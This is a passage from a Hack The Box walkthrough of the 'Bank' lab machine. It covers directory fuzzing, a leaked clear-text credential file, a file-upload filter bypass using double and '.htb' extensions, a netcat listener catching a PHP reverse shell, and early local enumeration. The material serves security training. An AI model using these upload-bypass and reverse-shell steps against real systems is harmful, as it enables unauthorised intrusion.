+</span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts">        <span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">var</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-readwrite z-ts">$ul</span></span> </span><span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-meta z-function-call z-ts"><span class="z-entity z-name z-function z-ts">$</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-variable z-language z-this z-ts">this</span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-meta z-function-call z-ts"><span class="z-punctuation z-accessor z-ts">.</span><span class="z-entity z-name z-function z-ts">next</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>ul<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-meta z-brace z-round z-ts">)</span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts">
+</span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts">        <span class="z-keyword z-control z-conditional z-ts">if</span> <span class="z-meta z-brace z-round z-ts">(</span><span class="z-meta z-function-call z-ts"><span class="z-variable z-other z-object z-ts">$li</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-entity z-name z-function z-ts">hasClass</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>open<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-meta z-brace z-round z-ts">)</span> <span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span>
+</span></span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-block z-ts">            <span class="z-meta z-function-call z-ts"><span class="z-variable z-other z-object z-ts">$ul</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-entity z-name z-function z-ts">slideUp</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-constant z-numeric z-decimal z-ts">350</span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-block z-ts">            <span class="z-meta z-function-call z-ts"><span class="z-variable z-other z-object z-ts">$li</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-entity z-name z-function z-ts">removeClass</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>open<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-block z-ts">        <span class="z-punctuation z-definition z-block z-ts">}</span></span> <span class="z-keyword z-control z-conditional z-ts">else</span> <span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span>
+</span></span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-block z-ts">            <span class="z-meta z-function-call z-ts"><span class="z-entity z-name z-function z-ts">$</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>.nav &gt; li &gt; ul<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-meta z-function-call z-ts"><span class="z-punctuation z-accessor z-ts">.</span><span class="z-entity z-name z-function z-ts">slideUp</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-constant z-numeric z-decimal z-ts">350</span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-block z-ts">            <span class="z-meta z-function-call z-ts"><span class="z-entity z-name z-function z-ts">$</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>.nav &gt; li<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-meta z-function-call z-ts"><span class="z-punctuation z-accessor z-ts">.</span><span class="z-entity z-name z-function z-ts">removeClass</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>open<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-block z-ts">            <span class="z-meta z-function-call z-ts"><span class="z-variable z-other z-object z-ts">$ul</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-entity z-name z-function z-ts">slideDown</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-constant z-numeric z-decimal z-ts">350</span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-block z-ts">            <span class="z-meta z-function-call z-ts"><span class="z-variable z-other z-object z-ts">$li</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-entity z-name z-function z-ts">addClass</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>open<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-block z-ts">        <span class="z-punctuation z-definition z-block z-ts">}</span></span>
+</span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts">    <span class="z-punctuation z-definition z-block z-ts">}</span></span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">}</span></span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></code></pre>
+<p>It's really not interesting.</p>
+<p>The <code>a</code> file is also very unusual, but if we browse to it we get a <code>404</code> webpage.</p>
+<p>I don't see anything interesting.</p>
+<h3 id="directory-fuzzing">Directory fuzzing</h3>
+<p>Let's see if this website hides unliked web pages and directories.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ffuf<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>c</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> http://bank.htb/FUZZ<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>e</span> .php</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">[Status: 302, Size: 7322, Words: 3793, Lines: 189, Duration: 29ms]
+</span><span class="z-text z-plain">| URL | http://bank.htb/index.php
+</span><span class="z-text z-plain">| --&gt; | login.php
+</span><span class="z-text z-plain">    * FUZZ: index.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 1974, Words: 595, Lines: 52, Duration: 24ms]
+</span><span class="z-text z-plain">| URL | http://bank.htb/login.php
+</span><span class="z-text z-plain">    * FUZZ: login.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 302, Size: 3291, Words: 784, Lines: 84, Duration: 28ms]
+</span><span class="z-text z-plain">| URL | http://bank.htb/support.php
+</span><span class="z-text z-plain">| --&gt; | login.php
+</span><span class="z-text z-plain">    * FUZZ: support.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 25ms]
+</span><span class="z-text z-plain">| URL | http://bank.htb/uploads
+</span><span class="z-text z-plain">| --&gt; | http://bank.htb/uploads/
+</span><span class="z-text z-plain">    * FUZZ: uploads
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 24ms]
+</span><span class="z-text z-plain">| URL | http://bank.htb/assets
+</span><span class="z-text z-plain">| --&gt; | http://bank.htb/assets/
+</span><span class="z-text z-plain">    * FUZZ: assets
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 25ms]
+</span><span class="z-text z-plain">| URL | http://bank.htb/logout.php
+</span><span class="z-text z-plain">| --&gt; | index.php
+</span><span class="z-text z-plain">    * FUZZ: logout.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 301, Words: 20, Lines: 10, Duration: 22ms]
+</span><span class="z-text z-plain">| URL | http://bank.htb/inc
+</span><span class="z-text z-plain">| --&gt; | http://bank.htb/inc/
+</span><span class="z-text z-plain">    * FUZZ: inc
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 279, Words: 21, Lines: 11, Duration: 25ms]
+</span><span class="z-text z-plain">| URL | http://bank.htb/.php
+</span><span class="z-text z-plain">    * FUZZ: .php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 302, Size: 7322, Words: 3793, Lines: 189, Duration: 30ms]
+</span><span class="z-text z-plain">| URL | http://bank.htb/
+</span><span class="z-text z-plain">| --&gt; | login.php
+</span><span class="z-text z-plain">    * FUZZ: 
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 288, Words: 21, Lines: 11, Duration: 27ms]
+</span><span class="z-text z-plain">| URL | http://bank.htb/server-status
+</span><span class="z-text z-plain">    * FUZZ: server-status
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 24ms]
+</span><span class="z-text z-plain">| URL | http://bank.htb/balance-transfer
+</span><span class="z-text z-plain">| --&gt; | http://bank.htb/balance-transfer/
+</span><span class="z-text z-plain">    * FUZZ: balance-transfer
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>There's a few good hits.</p>
+<p>The path <code>/support.php</code> could be interesting, but it redirects to <code>/login.php</code>.</p>
+<p>There's also <code>/inc</code> which redirects to <code>/inc/</code>, and <code>/balance-transfer</code> which redirects to <code>/balance-transfer/</code>.</p>
+<h3 id="exploring-inc">Exploring <code>/inc/</code></h3>
+<p>Let's browse to <code>http://bank.htb/inc/</code>:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/bank/domain-inc-folder.png" alt="Domain '/inc/' folder" /></p>
+<p>Okay, so there's a few PHP files, probably the source code of the website.</p>
+<p>One of them is named <code>header.php</code>, and if we click on it we are redirected to <code>/inc/login.php</code>. Therefore, it must be included in all PHP files, perhaps for handling authentication!</p>
+<p>Unfortunately, there's no way to retrieve the source code of the PHP files, as the code gets executed if we browse to these files.</p>
+<h3 id="exploring-balance-transfer">Exploring <code>/balance-transfer/</code></h3>
+<p>Let's browse to <code>http://bank.htb/balance-transfer/</code>:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/bank/domain-balance-transfer-folder.png" alt="Domain '/balance-transfer/' folder" /></p>
+<p>There's a massive amount of <code>.acc</code> files.</p>
+<p>I'll download the first one. Its content is the following:</p>
+<pre class="z-code"><code><span class="z-text z-plain">++OK ENCRYPT SUCCESS
+</span><span class="z-text z-plain">+=================+
+</span><span class="z-text z-plain">| HTB Bank Report |
+</span><span class="z-text z-plain">+=================+
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">===UserAccount===
+</span><span class="z-text z-plain">Full Name: czeCv3jWYYljNI2mTedDWxNCF37ddRuqrJ2WNlTLje47X7tRlHvifiVUm27AUC0ll2i9ocUIqZPo6jfs0KLf3H9qJh0ET00f3josvjaWiZkpjARjkDyokIO3ZOITPI9T
+</span><span class="z-text z-plain">Email: 1xlwRvs9vMzOmq8H3G5npUroI9iySrrTZNpQiS0OFzD20LK4rPsRJTfs3y1VZsPYffOy7PnMo0PoLzsdpU49OkCSSDOR6DPmSEUZtiMSiCg3bJgAElKsFmlxZ9p5MfrE
+</span><span class="z-text z-plain">Password: TmEnErfX3w0fghQUCAniWIQWRf1DutioQWMvo2srytHOKxJn76G4Ow0GM2jgvCFmzrRXtkp2N6RyDAWLGCPv9PbVRvbn7RKGjBENW3PJaHiOhezYRpt0fEV797uhZfXi
+</span><span class="z-text z-plain">CreditCards: 5
+</span><span class="z-text z-plain">Transactions: 93
+</span><span class="z-text z-plain">Balance: 905948 .
+</span><span class="z-text z-plain">===UserAccount===
+</span></code></pre>
+<p>I'll do the same for the second one:</p>
+<pre class="z-code"><code><span class="z-text z-plain">++OK ENCRYPT SUCCESS
+</span><span class="z-text z-plain">+=================+
+</span><span class="z-text z-plain">| HTB Bank Report |
+</span><span class="z-text z-plain">+=================+
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">===UserAccount===
+</span><span class="z-text z-plain">Full Name: WSO99GxdMW3WYxJwPIEqJHyt5UEAxnKtfyDpfaC16GY5dIB3rgtaY1E3WjDtGnWWWAlcKYdREbWSUxVlNpvLraPnttQaRN6Onr08pdZ4pWWjuREhha3IlT5OmVYdJ416
+</span><span class="z-text z-plain">Email: w1fWfe1EbXYFPDX6N1O8UTXhPWuz1wGxyVuNavsltq0i3YpRZe0T8YaXUFxVcdtK8Xyit0EWrFfuDFmCTmw1kGYfmwayJDjRBRa5SP2juhO7WaJPxfRSWQ7jmhS5VbXw
+</span><span class="z-text z-plain">Password: 38CVXEerW3zSdjILzzDvpKPL1HRXTOuXW6TUK8mGbVzoei9NSNjhx83zQVwKJ1IG7BBSJXzUS8j7qtUjgeAOnEnezUZjVH03iBV1zuWsDfz4IunZIYN6Cakc5jw00w3i
+</span><span class="z-text z-plain">CreditCards: 0
+</span><span class="z-text z-plain">Transactions: 149
+</span><span class="z-text z-plain">Balance: 3301234 .
+</span><span class="z-text z-plain">===UserAccount===
+</span></code></pre>
+<p>These files look really similar!</p>
+<p>According to the header, they constitute bank reports of transactions. There's a few fields like <code>CreditCards</code>, <code>Transcations</code> and <code>Balance</code> that keep track of some data. The <code>Full Name</code>, <code>Email</code> and <code>Password</code> seem to be encrypted though, as indicated by the '++OK ENCRYPT SUCCESS' message. With this information, we would've been able to log in as these users...</p>
+<p>Let's try to retrieve it then!</p>
+<h3 id="hash-cracking">Hash cracking</h3>
+<p>Let's enter the email of the first file we downloaded on <a href="https://crackstation.net/">Crackstation</a>. Here's the result:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/bank/crackstation-result-email-hash.png" alt="CrackStation result for the first 'email' hash we got" /></p>
+<p>Unfortunately, the hash format wasn't recognized.</p>
+<h3 id="failed-encryption">Failed encryption</h3>
+<p>The <code>.acc</code> files we opened had encrypted login information, so we were unable to use it to log in to the website. But maybe the encryption failed for one of them?</p>
+<p>Let's get the number of files first.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span> http://bank.htb/balance-transfer/</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>oP</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>\S+\.acc<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">wc</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>l</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">999
+</span></code></pre>
+<p>So there's <code>999</code> files. This would be impossible to manually download and verify each file, so we have to think here.</p>
+<p>If the encryption failed for one of these files, the <code>Full Name</code>, <code>Email</code> and <code>Password</code> would be in plaintext. We've seen that the encrypted form was really long, likely lengthier that the initial values. Therefore, if the encryption failed for one file, it should have a shorter size! Assuming there's no endless error message if the encryption failed, which would make the size bigger than the other files.</p>
+<p>If we browse to <code>http://bank.htb/balance-transfer/</code> again, we can click on <code>Size</code> to sort the files by size. We see that one file named <code>	68576f20e9732f1b2edc4df5b8533230.acc</code> has a size of <code>257</code> instead of <code>580</code>-ish! Let's download it and get its content.</p>
+<pre class="z-code"><code><span class="z-text z-plain">--ERR ENCRYPT FAILED
+</span><span class="z-text z-plain">+=================+
+</span><span class="z-text z-plain">| HTB Bank Report |
+</span><span class="z-text z-plain">+=================+
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">===UserAccount===
+</span><span class="z-text z-plain">Full Name: Christos Christopoulos
+</span><span class="z-text z-plain">Email: chris@bank.htb
+</span><span class="z-text z-plain">Password: !##HTBB4nkP4ssw0rd!##
+</span><span class="z-text z-plain">CreditCards: 5
+</span><span class="z-text z-plain">Transactions: 39
+</span><span class="z-text z-plain">Balance: 8842803 .
+</span><span class="z-text z-plain">===UserAccount===
+</span></code></pre>
+<p>We have cleartext credentials!</p>
+<h3 id="logging-in-as-chris">Logging in as <code>chris</code></h3>
+<p>Let's try these credentials to log in to the Apache website.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/bank/domain-dashboard-page.png" alt="Domain dashboard page" /></p>
+<p>It worked! We have access to an interface displaying various information related to <code>chris</code>'s bank account, like 'Balance', 'Total Transactions' or 'CreditCard Information'.</p>
+<p>There's also a 'Support' tab, which redirects to <code>/support.php</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/bank/domain-support-page.png" alt="Domain support page" /></p>
+<p>We can fill a form to send a ticket.</p>
+<p>What looks interesting is that we can choose a file to submit, and see our tickets afterwards. Maybe we could use this to upload a shell and get it to execute on the server?</p>
+<h1 id="foothold-file-upload">Foothold (File upload)</h1>
+<p>Let's try this theory to obtain a reverse shell.</p>
+<h2 id="preparation">Preparation</h2>
+<p>I'll use <a href="https://www.revshells.com/">this website</a> to find appropriate payloads.</p>
+<p>First, I'll setup a listener to receive the shell.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> 9001</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">listening on [any] 9001 ...
+</span></code></pre>
+<p>Now, let's create the PHP file to get the reverse shell. I'm going to use the 'PHP Ivan Sincek' one from the last website, configured to use a <code>sh</code> shell. The payload is more than 100 lines long, so I won't include it here.</p>
+<p>Let's save it as <code>/workspace/revshell.php</code>.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Now let's fill the form with random values, and choose the <code>revshell.php</code> file.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/bank/domain-support-page-php-reverse-shell.png" alt="Domain support page filled with PHP reverse shell" /></p>
+<p>Let's press 'Submit'.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/bank/domain-support-page-image-error-message.png" alt="Domain support page image error message" /></p>
+<p>Unfortunately, the website validated the image and realized that it wasn't a file.</p>
+<h3 id="bypassing-the-validation">Bypassing the validation</h3>
+<p>I replayed the request using Caido, and it turns out that adding a double extension <code>.php.png</code> is enough to bypass the validation.</p>
+<p>Let's try again to fill the form, with the new named file.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/bank/domain-support-page-image-success-message.png" alt="Domain support page image success message" /></p>
+<p>It worked. The ticket is now listed in the 'My Tickets' section.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/bank/domain-support-page-my-tickets-section.png" alt="Domain support page 'My Tickets' section" /></p>
+<p>Let's click on 'Click Here' to see our reverse shell.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/bank/domain-revshell-php-png-page.png" alt="Domain 'revshell.php.png' page" /></p>
+<p>Unfortunately, it doesn't get executed...</p>
+<h3 id="finding-a-valid-extension">Finding a valid extension</h3>
+<p>I tried others extensions used to execute PHP code, but they are all blocked.</p>
+<p>At this point, I checked the previous requests using Caido for any hints. And I found one in <code>/support.php</code>'s body:</p>
+<pre data-lang="html" class="language-html z-code"><code class="language-html" data-lang="html"><span class="z-text z-html z-basic"><span class="z-meta z-tag z-other z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span></span><span class="z-meta z-tag z-other z-html"><span class="z-entity z-name z-tag z-other z-html">SNIP</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
+</span><span class="z-text z-html z-basic"><span class="z-comment z-block z-html"><span class="z-punctuation z-definition z-comment z-begin z-html">&lt;!--</span> [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] <span class="z-punctuation z-definition z-comment z-end z-html">--&gt;</span></span>
+</span><span class="z-text z-html z-basic"><span class="z-meta z-tag z-other z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span></span><span class="z-meta z-tag z-other z-html"><span class="z-entity z-name z-tag z-other z-html">SNIP</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
+</span></code></pre>
+<p>It looks like what we were looking for! Let's try once again to upload a reverse shell PHP file, this time with a <code>.htb</code> extension. Then, I'll access it to execute it.</p>
+<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.20] from (UNKNOWN) [10.10.10.29] 37278
+</span><span class="z-text z-plain">SOCKET: Shell has connected! PID: 1268
+</span></code></pre>
+<p>The listener caught the shell!</p>
+<p>This shell is quite limited though, so let's execute a Python one-liner to transform it into an interactive one:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">python3</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>c</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>import pty; pty.spawn(&quot;/bin/bash&quot;)<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">www-data@bank:/var/www/bank/uploads$
+</span></code></pre>
+<p>That's better!</p>
+<h1 id="local-enumeration">Local enumeration</h1>
+<p>If we run <code>whoami</code>, we see that we got access as <code>www-data</code>.</p>
+<h2 id="distribution">Distribution</h2>
+<p>Let's see which distribution Bank is using.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">Bankwww-data@bank:/var/www/bank/uploads$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat /etc/os-release</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">NAME=&quot;Ubuntu&quot;
+</span><span class="z-text z-plain">VERSION=&quot;14.04.5 LTS, Trusty Tahr&quot;
+</span><span class="z-text z-plain">ID=ubuntu
+</span><span class="z-text z-plain">ID_LIKE=debian
+</span><span class="z-text z-plain">PRETTY_NAME=&quot;Ubuntu 14.04.5 LTS&quot;
+</span><span class="z-text z-plain">VERSION_ID=&quot;14.04&quot;
+</span><span class="z-text z-plain">HOME_URL=&quot;http://www.ubuntu.com/&quot;
+</span><span class="z-text z-plain">SUPPORT_URL=&quot;http://help.ubuntu.com/&quot;
+</span><span class="z-text z-plain">BUG_REPORT_URL=&quot;http://bugs.launchpad.net/ubuntu/&quot;
+</span></code></pre>
+<p>So this is Ubuntu 14.04.5, okay. That's pretty recent, so we're unlikely to find vulnerabilities here.</p>
+<h2 id="architecture">Architecture</h2>
+<p>What is Bank's architecture?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">Bankwww-data@bank:/var/www/bank/uploads$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">i686
+</span></code></pre>
+<p>So this system is using x86. This will be useful to know if we want to compile our own exploits.</p>
+<h2 id="kernel">Kernel</h2>
+<p>Maybe Bank is vulnerable to a kernel exploit?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">Bankwww-data@bank:/var/www/bank/uploads$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">4.4.0-79-generic
+</span></code></pre>
+<p>It's a bit old, maybe there's some vulnerabilities here.</p>
+<h2 id="apparmor">AppArmor</h2>
+<p>Let's list the applications AppArmor profiles:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">Bankwww-data@bank:/var/www/bank/uploads$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lap</span> /etc/apparmor.d/</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>/<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">-rw-r--r--  1 root root 2489 Apr 15  2016 sbin.dhclient
+</span><span class="z-text z-plain">-rw-r--r--  1 root root 1106 Apr 25  2017 usr.sbin.mysqld
+</span><span class="z-text z-plain">-rw-r--r--  1 root root 1342 Apr 13  2017 usr.sbin.named
